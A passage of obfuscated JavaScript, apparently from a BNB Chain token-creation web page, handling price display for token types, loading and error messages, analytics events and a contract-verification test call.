      $(_0x26bc8e(0x1cd))[_0x26bc8e(0x146)](_0x26bc8e(0x193)))
    : ($(_0x26bc8e(0x136))["text"](_0xd5072c + "\x20BNB"),
      $(_0x26bc8e(0x194))["css"]("display", _0x26bc8e(0x15d)),
      $(_0x26bc8e(0x1cd))[_0x26bc8e(0x146)](_0xd5072c + "\x20BNB"));
}
export function getPriceQuick() {
  var _0x17ad51 = a0_0x17fc16,
    _0x365bbd = $(_0x17ad51(0x136))["text"]();
  return (
    (_0x365bbd = _0x365bbd[_0x17ad51(0x144)]("\x20")[0x0]),
    (_0x365bbd = _0x365bbd[_0x17ad51(0x197)]()),
    _0x365bbd
  );
}
export function addPrice(_0xd51b61) {
  var _0x3f771c = getPriceQuick();
  setPrice(parseFloat(_0x3f771c) + _0xd51b61);
}
export function subPrice(_0x3d6fb0) {
  var _0x3d0305 = getPriceQuick();
  setPrice(parseFloat(_0x3d0305) - _0x3d6fb0);
}
setPrice(0.1);
var priceList = {
  standard: 0.1,
  safemoon: 0.15,
  liquiditygenerator: 0.15,
  frictionlessyield: 0.15,
  marketingtax: 0.2,
  smarttax: 0.2,
  rewardtoken: 0.2,
  rewardtoken2: 0.5,
  promax: 0.39,
  customizedToken: 0x2,
};
$(a0_0x17fc16(0x167))["on"](a0_0x17fc16(0x1c1), () => {
  var _0x155ed5 = a0_0x17fc16,
    _0xcf7dc3 = $(_0x155ed5(0x167))[_0x155ed5(0x1a9)]();
  logGaEvent("click_" + _0xcf7dc3),
    console[_0x155ed5(0x1a0)]("token_type:", _0xcf7dc3),
    setPrice(priceList[_0xcf7dc3]);
});
function getTokenType() {
  var _0x5ced55 = a0_0x17fc16,
    _0x1e8589 = $(_0x5ced55(0x167))[_0x5ced55(0x1a9)]();
  return _0x1e8589;
}
console[a0_0x17fc16(0x1a0)](a0_0x17fc16(0x137), getTokenType());
function showLoading() {
  var _0xf4f2da = a0_0x17fc16;
  $(_0xf4f2da(0x1a6))[_0xf4f2da(0x1c2)](_0xf4f2da(0x1ce), "block"),
    $(_0xf4f2da(0x13a))[_0xf4f2da(0x1c2)]("display", _0xf4f2da(0x152)),
    hideError();
}
function hideLoading() {
  var _0x23a52b = a0_0x17fc16;
  $(_0x23a52b(0x1a6))[_0x23a52b(0x1c2)]("display", _0x23a52b(0x15d)),
    $(_0x23a52b(0x13a))[_0x23a52b(0x1c2)](_0x23a52b(0x1ce), _0x23a52b(0x15d)),
    $(_0x23a52b(0x1ab))[_0x23a52b(0x1c2)]("display", _0x23a52b(0x15d));
}
function showError(_0x3fe2fa) {
  var _0x4e076f = a0_0x17fc16;
  JSON[_0x4e076f(0x157)](_0x3fe2fa) != "{}"
    ? ($(_0x4e076f(0x1be))["text"](JSON[_0x4e076f(0x157)](_0x3fe2fa)),
      $(_0x4e076f(0x1be))[_0x4e076f(0x1c2)](_0x4e076f(0x1ce), "block"))
    : (_0x3fe2fa[_0x4e076f(0x197)]()[_0x4e076f(0x1b4)](_0x4e076f(0x133))
        ? (getTokenType() == _0x4e076f(0x182)
            ? $(_0x4e076f(0x1be))[_0x4e076f(0x146)](_0x4e076f(0x1bd))
            : $(".error-create")[_0x4e076f(0x146)](_0x4e076f(0x153)),
          logGaEvent("insufficient_funds"))
        : (_0x3fe2fa[_0x4e076f(0x197)]()[_0x4e076f(0x18e)] <= 0x118
            ? $(_0x4e076f(0x1be))[_0x4e076f(0x146)](_0x3fe2fa)
            : $(_0x4e076f(0x1be))[_0x4e076f(0x146)](
                _0x3fe2fa["toString"]()[_0x4e076f(0x171)](0x0, 0x118) +
                  _0x4e076f(0x16d)
              ),
          !JSON[_0x4e076f(0x157)](_0x3fe2fa)[_0x4e076f(0x1b4)](
            _0x4e076f(0x1b7)
          ) && $(".tip")[_0x4e076f(0x1c2)]("display", "block"),
          _0x3fe2fa[_0x4e076f(0x197)]()[_0x4e076f(0x1b4)](_0x4e076f(0x13c)) &&
            logGaEvent(gaEvents[_0x4e076f(0x186)])),
      $(".error-create")["css"](_0x4e076f(0x1ce), _0x4e076f(0x152)));
}
function hideError() {
  var _0x344191 = a0_0x17fc16;
  $(".error-create")[_0x344191(0x1c2)](_0x344191(0x1ce), _0x344191(0x15d)),
    $(_0x344191(0x1b5))[_0x344191(0x1c2)](_0x344191(0x1ce), "none");
}
async function test_verify() {
  var _0x1d41e7 = a0_0x17fc16,
    _0x9aef4b = "0xC035834470Ecc0ff68aFFB2b966Ad0C85d9b0f15",
    _0x40e39d = await readTextFile(_0x1d41e7(0x149)),
    _0x222720 = _0x1d41e7(0x14c),
    _0x4dc1fc = _0x1d41e7(0x177),
    _0x6515d1 = encodeParameters(["string"], [_0x1d41e7(0x147)]);
  console[_0x1d41e7(0x1a0)](_0x40e39d),
    alert(_0x1d41e7(0x160)),
    verifyContract(_0x9aef4b, _0x40e39d, _0x4dc1fc, _0x222720, _0x6515d1);
}
$(a0_0x17fc16(0x14b))["on"](a0_0x17fc16(0x1cb), () => {
  test_verify();
}),
  $(".router\x20option[value=" + a0_0x17fc16(0x15e) + "]")[a0_0x17fc16(0x18f)](
    a0_0x17fc16(0x1a8),
    "selected"
  ),
  $(a0_0x17fc16(0x140))["on"](a0_0x17fc16(0x1c1), () => {
    var _0x538cea = a0_0x17fc16;
    logGaEvent("click_" + $(_0x538cea(0x1ba))[_0x538cea(0x146)]());
  });
